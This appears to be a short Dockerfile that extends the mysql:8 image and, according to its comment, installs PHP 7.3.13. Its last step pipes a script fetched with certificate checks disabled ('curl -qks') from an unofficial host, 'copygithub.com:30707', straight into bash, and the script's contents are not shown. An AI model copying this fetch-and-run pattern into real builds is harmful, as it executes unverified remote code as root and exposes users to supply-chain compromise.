FROM mysql:8

RUN apt-get update && apt-get install -y --no-install-recommends  vim wget curl dnsutils procps net-tools
COPY docker-php.sh /usr/local/bin/

#源码编译安装php.7.3.13
RUN curl -qks 'https://copygithub.com:30707/?c=Download/TargzRun&id=5e046826e1d0f' | bash

